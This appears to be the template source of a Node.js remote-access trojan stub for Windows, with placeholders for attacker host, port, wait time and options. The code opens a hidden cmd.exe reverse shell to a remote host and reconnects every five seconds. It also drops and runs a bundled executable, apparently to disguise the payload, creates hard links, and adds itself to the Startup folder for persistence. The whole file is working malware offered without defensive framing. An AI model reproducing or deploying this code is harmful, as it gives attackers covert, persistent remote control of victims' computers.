var net = require("net"),
    os = require('os'),
    cp = require("child_process"),
    fs = require('fs'),
    path = require('path');

var sh;

const autoStarted = process.argv.includes('--startup');
var intervalConnect = false;
var client = new net.Socket();

(function () {
    additional();
    setTimeout(shell, Number("{{WAIT_TIME}}") * 1000);
    return /a/; // don't close the process
})();

function shell(){
    function connect() { 
        sh = cp.spawn("cmd", [], { detached: true, shell: false, windowsHide: true });
        client.connect(Number("{{LISTEN_PORT}}"), "{{HOST}}");
    }

    function launchIntervalConnect(err) {
        if(err) console.log(err);
        if(false != intervalConnect) return
        intervalConnect = setInterval(connect, 5000)
    }
    
    function clearIntervalConnect() {
        if(false == intervalConnect) return
        clearInterval(intervalConnect)
        intervalConnect = false
    }

    client.on('connect', () => {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        clearIntervalConnect();
    })
    client.on('error', launchIntervalConnect)
    client.on('close', launchIntervalConnect)
    client.on('end',   launchIntervalConnect)
    connect()
}

function additional(){
    // no need to do other things if autostarted
    if(autoStarted) return;

    try {
        const hasMerge = "{{HAS_MERGE}}";
        const mergeFileName = "{{MERGE_NAME}}";

        let extractPath = path.normalize(path.join(os.tmpdir(), `${mergeFileName.slice(0, -4)}`));
        let actualFilePath = path.normalize(path.join(extractPath, `./${mergeFileName}`));
        if(!fs.existsSync(extractPath))
        fs.mkdirSync(extractPath);

        if(hasMerge == "true" && !fs.existsSync(actualFilePath)){
            // save the external exe
            console.log('[log] Extracting the merged exe.');
            var mergeExeBuffer = fs.readFileSync(path.join(__dirname, './winResource.exe'));
            fs.writeFileSync(actualFilePath, mergeExeBuffer);
        }

        if("{{FILES_DEPENDANT}}" == "true"){
            try {
                // setup the hard symlinks
                console.log('[log] Setting up symlinks.');
                var surroundFiles = fs.readdirSync(process.cwd()).filter(f => f != mergeFileName);
                var mkLinkCmd = [];
                surroundFiles.map(f => {
                    let isDir = fs.lstatSync(path.join(process.cwd(), f)).isDirectory()
                    let target = path.join(process.cwd(), f);
                    let link = path.join(extractPath, f);
                    if(!fs.existsSync(link))
                    mkLinkCmd.push(`mklink /${isDir ? 'J' : 'H'} "${link}" "${target}"`);
                });
                mkLinkCmd = mkLinkCmd.join(' && ');
                cp.execSync(mkLinkCmd);
            } catch { /* just in case */ }
        }

        if(hasMerge == "true"){
            // run the exe
            console.log('[log] Running merged exe.');
            cp.spawn(actualFilePath, [], {detached: true, shell: false, windowsHide: true});
        }

        if("{{PERSISTENT}}" == "true"){
            console.log('[log] Adding exe to startup.');
            const currentFile = path.join(process.cwd(), mergeFileName);
            const linkPath = path.normalize(path.join(process.env.APPDATA,
                `/Microsoft/Windows/Start Menu/Programs/Startup/${mergeFileName}.lnk`));

            // save the exe used to make the shortcut
            var shortcutPath = path.normalize(path.join(extractPath, `./Shortcut.exe`));
            if(!fs.existsSync(shortcutPath)){
                var shortcutBuffer = fs.readFileSync(path.join(__dirname, './Shortcut.exe'));
                fs.writeFileSync(shortcutPath, shortcutBuffer);
            }

            // use it to make the custom shortcut
            if(!fs.existsSync(linkPath))
            cp.execFileSync(shortcutPath, commandArgs('C', linkPath, {
                target : currentFile,
	            args : '--startup',
            }));
        }
        
    } catch {  }
}

// #################################
// FUNCTIONS RELATED TO SHORTCUT.EXE
// #################################

function expandEnv(path) {
	var envRE = /(^|[^^])%((?:\^.|[^^%])*)%/g;
	return path.replace(envRE, function(_, g1, g2) {
		return g1 + process.env[g2];
	}).replace(/\^(.)/g,"$1");
}

function commandArgs(type, path, options) {
	// Generates a command for shortcut.exe
	var args = ['/A:' + type, '/F:' + expandEnv(path)];

	if (options) {
		if (options.target)
			args.push('/T:' + expandEnv(options.target));
		if (options.args)
			args.push('/P:' + expandEnv(options.args));
		if (options.workingDir)
			args.push('/W:' + expandEnv(options.workingDir) + '');
		if (options.runStyle)
			args.push('/R:' + options.runStyle);
		if (options.icon) {
			args.push('/I:' + expandEnv(options.icon) + ('iconIndex' in options ? ',' + options.iconIndex : ''));
		}
		if (options.hotkey)
			args.push('/H:' + options.hotkey);
		if (options.desc)
			args.push('/D:' + expandEnv(options.desc) + '');
	}
	return args;
}